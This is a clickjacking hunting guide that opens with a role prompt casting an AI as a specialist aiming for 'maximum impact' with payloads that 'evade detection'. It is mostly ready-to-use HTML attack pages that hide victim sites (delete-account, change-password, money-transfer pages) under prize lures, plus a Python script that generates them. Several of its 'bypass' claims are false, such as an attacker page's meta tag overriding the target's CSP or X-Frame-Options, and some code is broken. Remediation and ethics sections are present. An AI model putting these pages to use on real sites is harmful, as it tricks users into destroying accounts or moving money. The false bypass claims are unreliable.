# Clickjacking and UI Redressing - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are a clickjacking and UI redressing specialist with deep expertise in exploiting visual deception attacks. Your mission is to identify, exploit, and prevent clickjacking vulnerabilities that allow attackers to trick users into performing unintended actions. You understand the intricate details of X-Frame-Options, CSP frame-ancestors, and the subtle vulnerabilities that arise from improper framing protections. You possess mastery over tools like ClickjackingPoC, Burp Suite extensions, and custom exploitation scripts. Your goal is to chain clickjacking with other attack vectors to achieve maximum impact, from account compromise to financial fraud. You approach every target with methodical precision, analyzing framing protections, identifying sensitive actions, and crafting payloads that evade detection while maintaining effectiveness.

## Core Concepts Deep Dive

### Clickjacking Fundamentals

Clickjacking (UI Redressing) is an attack where a user is tricked into clicking on a concealed element on a malicious page. The attack overlays a transparent iframe on top of a legitimate page, causing users to click on hidden buttons or links.

**Attack Flow:**
```
1. Attacker creates malicious page
2. Legitimate page is embedded in iframe
3. iframe is made transparent or positioned off-screen
4. User sees attacker's page but clicks on legitimate page
5. Unintended action is performed
```

**Visual Representation:**
```
+------------------------------------------+
|  Attacker's Page (visible)               |
|  +------------------------------------+  |
|  | "Click here to win a prize!"       |  |
|  +------------------------------------+  |
|  +------------------------------------+  |
|  | Legitimate Page (transparent)       |  |
|  | [Delete Account Button]             |  |
|  +------------------------------------+  |
+------------------------------------------+

User sees "Click here to win" but clicks "Delete Account"
```

### Clickjacking Variants

**Traditional Clickjacking:**
- Transparent iframe overlay
- Positioning tricks (z-index, opacity)
- Cursorjacking (custom cursor)

**Double-Clickjacking:**
- Requires two rapid clicks
- First click focuses the window
- Second click performs the action
- Bypasses some clickjacking protections

**Tapjacking (Mobile):**
- Mobile-specific clickjacking
- Touch event manipulation
- Scroll jacking
- Orientation-based attacks

**Likejacking:**
- Tricking users to "like" social media content
- Facebook, Twitter, LinkedIn
- Social engineering aspect

**Filejacking:**
- Tricking users to upload/download files
- Hidden file input elements
- Drag-and-drop attacks

### X-Frame-Options (XFO)

**Directives:**
```
DENY           - Page cannot be framed anywhere
SAMEORIGIN     - Page can be framed by same origin
ALLOW-FROM     - Page can be framed by specific origin (deprecated)
```

**Implementation:**
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com
```

### CSP frame-ancestors

**Syntax:**
```
frame-ancestors 'none';           # Equivalent to XFO: DENY
frame-ancestors 'self';           # Equivalent to XFO: SAMEORIGIN
frame-ancestors https://trusted.com;
frame-ancestors 'self' https://trusted.com;
```

### Clickjacking Impact Areas

1. **Account Actions** - Delete account, change password
2. **Financial Actions** - Transfer money, make purchases
3. **Privacy Actions** - Change email, share data
4. **Social Actions** - Follow, like, share
5. **Security Actions** - Enable 2FA, revoke sessions
6. **Administrative Actions** - Modify settings, delete resources

## Pre-requisite Knowledge

- Understanding of HTML, CSS, and JavaScript
- Knowledge of browser security model (same-origin policy)
- Familiarity with iframe mechanics
- Understanding of HTTP headers (X-Frame-Options, CSP)
- Knowledge of web application architecture
- Familiarity with common web frameworks
- Understanding of user interaction patterns

## Step-by-Step Hunting Methodology

### Phase 1: Identify Framing Protections

**Step 1: Check X-Frame-Options**
```bash
# Using curl
curl -I https://target.com | grep -i "x-frame-options"

# Using Burp Suite
# Check response headers

# Using browser DevTools
# Network tab → Response Headers
```

**Step 2: Check CSP frame-ancestors**
```bash
# Using curl
curl -I https://target.com | grep -i "content-security-policy"

# Look for frame-ancestors directive
```

**Step 3: Test Framing**
```html
<!-- Create test page -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
</head>
<body>
    <h1>Clickjacking Test</h1>
    <iframe src="https://target.com" width="800" height="600"></iframe>
    <script>
        // Check if iframe loaded
        iframe.onload = function() {
            try {
                // Try to access iframe content
                console.log("Framing allowed");
            } catch(e) {
                console.log("Framing blocked");
            }
        };
    </script>
</body>
</html>
```

### Phase 2: Identify Sensitive Actions

**Step 1: Map User Flows**
```
- Login/Logout
- Password change
- Email change
- Profile modification
- Payment/transfer
- Account deletion
- Settings changes
- Social actions (follow, like, share)
```

**Step 2: Identify Action Elements**
```html
<!-- Common action elements -->
<button type="submit">Submit</button>
<input type="submit" value="Submit">
<a href="/action">Click here</a>
<form action="/action" method="POST">
    <input type="hidden" name="token" value="...">
</form>
```

**Step 3: Test for Clickjacking**
```html
<!-- Test page for specific action -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {
            position: relative;
            width: 700px;
            height: 500px;
            opacity: 0.0001;
            z-index: 2;
        }
        .button {
            position: absolute;
            top: 350px;
            left: 50px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="button">Click here to win!</div>
    <iframe src="https://target.com/action-page"></iframe>
</body>
</html>
```

### Phase 3: Exploitation

**Step 1: Create Clickjacking PoC**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
        }
        .container {
            position: relative;
            width: 800px;
            margin: 0 auto;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: rgba(255,255,255,0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .fake-button {
            background: #ff4444;
            color: white;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.0001;
            border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="overlay">
            <h1>Click here to claim your prize!</h1>
            <div class="fake-button">CLICK HERE NOW!</div>
        </div>
        <iframe src="https://target.com/delete-account"></iframe>
    </div>
</body>
</html>
```

**Step 2: Test Bypass Techniques**
```html
<!-- X-Frame-Options: ALLOW-FROM bypass -->
<iframe src="https://target.com" style="display:none"></iframe>

<!-- CSP frame-ancestors bypass -->
<!-- Use meta tag instead of header -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors *">

<!-- Or use JavaScript -->
<script>
// Try to frame from different origin
</script>
```

**Step 3: Document Exploitation**
```
1. Target URL: https://target.com/delete-account
2. Protection: X-Frame-Options: SAMEORIGIN
3. Bypass: [technique used]
4. Payload: [exact HTML/JS]
5. Impact: Account deletion without user consent
```

## Tool Arsenal with Exact Commands

### ClickjackingPoC Generator

```bash
# Installation
git clone https://github.com/nicothin/Clickjacking-PoC
cd Clickjacking-PoC

# Generate PoC
python3 clickjacking_poc.py -u https://target.com/delete-account

# With custom styling
python3 clickjacking_poc.py -u https://target.com/delete-account \
  --fake-button "Click to win!" \
  --background "linear-gradient(135deg, #667eea 0%, #764ba2 100%)"
```

### Burp Suite Extensions

```
# Clickjacking PoC
- Install from BApp Store
- Generate PoC for any endpoint
- Test framing protections

# Frame Analysis
- Analyze iframe behavior
- Test X-Frame-Options bypass
- Check CSP frame-ancestors
```

### Custom Clickjacking Script

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import json

class ClickjackingTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.protections = {}
        self.sensitive_actions = []
    
    def check_protections(self):
        """Check clickjacking protections"""
        response = requests.get(self.target_url)
        
        # Check X-Frame-Options
        xfo = response.headers.get('X-Frame-Options', '')
        self.protections['xfo'] = xfo
        
        # Check CSP frame-ancestors
        csp = response.headers.get('Content-Security-Policy', '')
        if 'frame-ancestors' in csp:
            self.protections['csp_frame_ancestors'] = csp
        else:
            self.protections['csp_frame_ancestors'] = None
        
        return self.protections
    
    def test_framing(self):
        """Test if page can be framed"""
        test_html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Frame Test</title></head>
        <body>
            <iframe id="test" src="{self.target_url}" 
                    width="800" height="600"></iframe>
            <script>
                var iframe = document.getElementById('test');
                iframe.onload = function() {{
                    try {{
                        var doc = iframe.contentDocument || iframe.contentWindow.document;
                        document.getElementById('result').innerText = 'Framing allowed';
                    }} catch(e) {{
                        document.getElementById('result').innerText = 'Framing blocked';
                    }}
                }};
            </script>
            <div id="result">Testing...</div>
        </body>
        </html>
        """
        return test_html
    
    def find_sensitive_actions(self, html_content):
        """Find sensitive action elements in page"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Find forms with sensitive actions
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            if any(keyword in action.lower() for keyword in 
                   ['delete', 'remove', 'change', 'update', 'transfer', 'payment']):
                self.sensitive_actions.append({
                    'type': 'form',
                    'action': action,
                    'method': form.get('method', 'GET')
                })
        
        # Find buttons with sensitive text
        buttons = soup.find_all(['button', 'input'])
        for button in buttons:
            text = button.get_text() or button.get('value', '')
            if any(keyword in text.lower() for keyword in 
                   ['delete', 'remove', 'change', 'submit', 'confirm']):
                self.sensitive_actions.append({
                    'type': 'button',
                    'text': text,
                    'id': button.get('id'),
                    'class': button.get('class')
                })
        
        return self.sensitive_actions
    
    def generate_poc(self, action_element):
        """Generate clickjacking PoC for specific action"""
        poc_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Clickjacking PoC</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    margin: 0;
                    padding: 20px;
                }}
                .container {{
                    position: relative;
                    width: 800px;
                    margin: 0 auto;
                }}
                .overlay {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 1;
                    background: rgba(255,255,255,0.8);
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                }}
                .fake-button {{
                    background: #ff4444;
                    color: white;
                    padding: 15px 30px;
                    border-radius: 5px;
                    font-size: 18px;
                    cursor: pointer;
                    margin: 10px;
                }}
                iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 0;
                    opacity: 0.0001;
                    border: none;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="overlay">
                    <h1>Click here to claim your prize!</h1>
                    <div class="fake-button">CLICK HERE NOW!</div>
                </div>
                <iframe src="{self.target_url}"></iframe>
            </div>
        </body>
        </html>
        """
        return poc_html
    
    def bypass_xfo(self):
        """Test X-Frame-Options bypass techniques"""
        bypasses = []
        
        # Check for ALLOW-FROM with different origins
        origins = [
            "https://evil.com",
            "null",
            "https://target.com.evil.com",
            "https://evil.com/target.com"
        ]
        
        for origin in origins:
            headers = {'Referer': origin}
            response = requests.get(self.target_url, headers=headers)
            if 'X-Frame-Options' not in response.headers:
                bypasses.append(f"ALLOW-FROM bypass with origin: {origin}")
        
        return bypasses
    
    def bypass_csp_frame_ancestors(self):
        """Test CSP frame-ancestors bypass techniques"""
        bypasses = []
        
        # Check for meta tag override
        response = requests.get(self.target_url)
        if '<meta' in response.text.lower() and 'frame-ancestors' in response.text:
            bypasses.append("CSP frame-ancestors in meta tag (can be overridden)")
        
        # Check for report-only mode
        csp_header = response.headers.get('Content-Security-Policy-Report-Only', '')
        if 'frame-ancestors' in csp_header:
            bypasses.append("CSP frame-ancestors in report-only mode (not enforced)")
        
        return bypasses
    
    def full_scan(self):
        """Perform full clickjacking scan"""
        print(f"[*] Scanning: {self.target_url}")
        
        # Check protections
        protections = self.check_protections()
        print(f"\n[*] Protections:")
        print(f"  X-Frame-Options: {protections.get('xfo', 'None')}")
        print(f"  CSP frame-ancestors: {protections.get('csp_frame_ancestors', 'None')}")
        
        # Test framing
        print(f"\n[*] Testing framing...")
        framing_test = self.test_framing()
        print(f"  Generated test page")
        
        # Find sensitive actions
        response = requests.get(self.target_url)
        actions = self.find_sensitive_actions(response.text)
        print(f"\n[*] Sensitive actions found: {len(actions)}")
        for action in actions:
            print(f"  {action['type']}: {action.get('action', action.get('text'))}")
        
        # Test bypasses
        print(f"\n[*] Testing bypasses:")
        xfo_bypasses = self.bypass_xfo()
        for bypass in xfo_bypasses:
            print(f"  XFO bypass: {bypass}")
        
        csp_bypasses = self.bypass_csp_frame_ancestors()
        for bypass in csp_bypasses:
            print(f"  CSP bypass: {bypass}")
        
        # Generate PoC
        if actions:
            print(f"\n[*] Generating PoC...")
            poc = self.generate_poc(actions[0])
            print(f"  PoC generated")
        
        return {
            'protections': protections,
            'actions': actions,
            'bypasses': xfo_bypasses + csp_bypasses
        }

# Usage
tester = ClickjackingTester("https://target.com/delete-account")
results = tester.full_scan()
```

## Real-World Case Studies

### Case Study 1: Account Deletion via Clickjacking

**Scenario:** A social media platform has no clickjacking protection on the account deletion page.

**Discovery:**
```bash
# Step 1: Check protections
curl -I https://target.com/delete-account | grep -i "x-frame-options"
# No X-Frame-Options header

curl -I https://target.com/delete-account | grep -i "content-security-policy"
# No CSP header

# Step 2: Test framing
curl https://target.com/delete-account
# Page loads normally, no framing restrictions
```

**Exploitation:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Account Deletion Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            position: relative;
            width: 800px;
            margin: 0 auto;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: rgba(255,255,255,0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .fake-button {
            background: #4CAF50;
            color: white;
            padding: 20px 40px;
            border-radius: 10px;
            font-size: 24px;
            cursor: pointer;
            margin: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.0001;
            border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="overlay">
            <h1>Click here to claim your free iPhone!</h1>
            <div class="fake-button">CLICK HERE NOW!</div>
        </div>
        <iframe src="https://target.com/delete-account"></iframe>
    </div>
</body>
</html>
```

### Case Study 2: Double-Clickjacking Bypass

**Scenario:** Application uses X-Frame-Options but is vulnerable to double-clickjacking.

**Discovery:**
```bash
# Step 1: Check protections
curl -I https://target.com/change-password | grep -i "x-frame-options"
# X-Frame-Options: SAMEORIGIN

# Step 2: Test double-clickjacking
# First click focuses the window
# Second click performs the action
```

**Exploitation:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Double-Clickjacking Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
        }
        .container {
            position: relative;
            width: 800px;
            margin: 0 auto;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: rgba(255,255,255,0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .fake-button {
            background: #ff4444;
            color: white;
            padding: 20px 40px;
            border-radius: 10px;
            font-size: 24px;
            cursor: pointer;
            margin: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.0001;
            border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="overlay">
            <h1>Double-click to claim your prize!</h1>
            <div class="fake-button">DOUBLE-CLICK NOW!</div>
        </div>
        <iframe src="https://target.com/change-password"></iframe>
    </div>
    <script>
        // Double-clickjacking script
        document.querySelector('.fake-button').addEventListener('dblclick', function() {
            // First click focuses the iframe
            // Second click performs the action
        });
    </script>
</body>
</html>
```

### Case Study 3: Tapjacking on Mobile

**Scenario:** Mobile application is vulnerable to tapjacking.

**Discovery:**
```bash
# Step 1: Test mobile framing
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15" \
  https://target.com/transfer-money

# Step 2: Check for mobile-specific protections
curl -I https://target.com/transfer-money | grep -i "x-frame-options"
# No mobile-specific protections
```

**Exploitation:**
```html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tapjacking Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 10px;
        }
        .container {
            position: relative;
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            background: rgba(255,255,255,0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .fake-button {
            background: #4CAF50;
            color: white;
            padding: 20px 40px;
            border-radius: 10px;
            font-size: 20px;
            cursor: pointer;
            margin: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.0001;
            border: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="overlay">
            <h1>Tap here to claim your prize!</h1>
            <div class="fake-button">TAP NOW!</div>
        </div>
        <iframe src="https://target.com/transfer-money"></iframe>
    </div>
</body>
</html>
```

## Advanced Techniques and Bypass

### X-Frame-Options Bypass

**ALLOW-FROM Bypass:**
```html
<!-- If X-Frame-Options: ALLOW-FROM https://trusted.com -->
<!-- Try different origins -->
<iframe src="https://target.com" style="display:none"></iframe>

<!-- Or use meta tag -->
<meta http-equiv="X-Frame-Options" content="ALLOW-FROM https://evil.com">
```

**Browser-Specific Bypass:**
```html
<!-- Older browsers may not support XFO -->
<!-- Use CSP frame-ancestors instead -->
<iframe src="https://target.com"></iframe>
```

### CSP frame-ancestors Bypass

**Meta Tag Override:**
```html
<!-- If CSP is only in header, meta tag may override -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors *">
<iframe src="https://target.com"></iframe>
```

**Report-Only Mode:**
```html
<!-- If CSP is report-only, it's not enforced -->
<!-- Check for Content-Security-Policy-Report-Only header -->
<iframe src="https://target.com"></iframe>
```

### Cursorjacking

**Custom Cursor Attack:**
```html
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            cursor: url('https://attacker.com/transparent.png'), auto;
        }
    </style>
</head>
<body>
    <iframe src="https://target.com" style="opacity:0.0001"></iframe>
</body>
</html>
```

### Scroll Jacking

**Scroll-Based Clickjacking:**
```html
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            overflow: hidden;
        }
        .scroll-container {
            height: 100vh;
            overflow-y: scroll;
        }
    </style>
</head>
<body>
    <div class="scroll-container">
        <iframe src="https://target.com" style="height: 200vh"></iframe>
    </div>
</body>
</html>
```

## Detection and Indicators

### Browser Console Indicators

```
Refused to display 'https://target.com' in a frame because it set 'X-Frame-Options' to 'deny'.
```

### HTTP Header Analysis

```bash
# Check for clickjacking protections
curl -I https://target.com | grep -i "x-frame-options"
curl -I https://target.com | grep -i "content-security-policy"

# Check for frame-ancestors
curl -I https://target.com | grep -i "frame-ancestors"
```

### Log Indicators

```
[CLICKJACK] Framing attempt from https://evil.com
[CLICKJACK] X-Frame-Options bypass attempt
[CSP] frame-ancestors violation from https://evil.com
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Account takeover | Password change/delete |
| High | Financial fraud | Money transfer, purchase |
| High | Privacy violation | Email change, data sharing |
| Medium | Social manipulation | Likejacking, followjacking |
| Low | Configuration change | Settings modification |

## Common Pitfalls

1. **Not testing all pages** - Clickjacking can affect any page
2. **Ignoring mobile** - Tapjacking on mobile devices
3. **Overlooking double-clickjacking** - Bypasses some protections
4. **Not testing different browsers** - Browser-specific behavior
5. **Ignoring CSP frame-ancestors** - Modern protection
6. **Forgetting about subdomains** - Subdomain framing
7. **Not testing with authentication** - Authenticated clickjacking
8. **Ignoring scroll jacking** - Scroll-based attacks
9. **Not considering user interaction** - Double-click, long-press
10. **Forgetting about touch events** - Mobile-specific attacks

## Integration with Other Hunting Areas

- **CSRF**: Clickjacking can bypass CSRF tokens
- **XSS**: Clickjacking + XSS = full account takeover
- **Phishing**: Clickjacking for credential theft
- **Social Engineering**: Clickjacking as social engineering tool
- **Session Hijacking**: Clickjacking to steal sessions
- **Privilege Escalation**: Clickjacking to modify permissions
- **Financial Fraud**: Clickjacking for unauthorized transactions

## Reporting Template

```
## Vulnerability: Clickjacking / UI Redressing

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Protection: [XFO/CSP/None]

### Vulnerability Details
- Type: [Traditional/Double/Tap/Scroll]
- Bypass: [technique used]
- Sensitive Action: [action that can be performed]

### Proof of Concept
[HTML file that demonstrates the attack]

### Impact
[Detailed impact analysis]

### Remediation
- Implement X-Frame-Options: DENY or SAMEORIGIN
- Use CSP frame-ancestors
- Test all sensitive actions
- Consider double-clickjacking protections
- Implement frame-busting scripts

### References
- CWE-1021: Improper Restriction of Rendered UI Layers
- OWASP: Clickjacking
- https://owasp.org/www-community/attacks/Clickjacking
```

## Practice Labs

### Clickjacking Labs

**PortSwigger Clickjacking Labs:**
- https://portswigger.net/web-security/clickjacking
- Free hands-on labs

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# Clickjacking challenges included
```

**OWASP WebGoat:**
```bash
git clone https://github.com/WebGoat/WebGoat
# Clickjacking module
```

### Practice Commands

```bash
# Test clickjacking
curl -I https://target.com | grep -i "x-frame-options"

# Generate PoC
python3 clickjacking_poc.py -u https://target.com/delete-account

# Test bypass
curl -H "Referer: https://evil.com" https://target.com

# Check CSP
curl -I https://target.com | grep -i "content-security-policy"
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not perform attacks that could cause damage**
3. **Report all findings to the system owner**
4. **Do not steal user data or credentials**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### Clickjacking Testing Checklist

```
[ ] Identify all pages without framing protection
[ ] Check X-Frame-Options header
[ ] Check CSP frame-ancestors
[ ] Test for sensitive actions
[ ] Test for bypasses
[ ] Generate PoC
[ ] Test on mobile devices
[ ] Document all findings
```

### Common Bypass Payloads

**XFO ALLOW-FROM Bypass:**
```html
<iframe src="https://target.com" style="display:none"></iframe>
```

**CSP frame-ancestors Bypass:**
```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors *">
<iframe src="https://target.com"></iframe>
```

**Double-Clickjacking:**
```html
<iframe src="https://target.com" style="opacity:0.0001"></iframe>
<script>
document.querySelector('.button').addEventListener('dblclick', function() {
    // First click focuses, second click performs action
});
</script>
```

### Quick Commands

```bash
# Check XFO
curl -I https://target.com | grep -i x-frame-options

# Check CSP
curl -I https://target.com | grep -i content-security-policy

# Test framing
curl -H "Referer: https://evil.com" https://target.com

# Generate PoC
python3 clickjacking_poc.py -u https://target.com
```

### Clickjacking Prevention

```
1. X-Frame-Options: DENY
2. CSP frame-ancestors 'none'
3. Frame-busting scripts (legacy)
4. Test all sensitive actions
5. Consider double-clickjacking
6. Implement on all pages
7. Test on mobile devices
8. Monitor for framing attempts
```
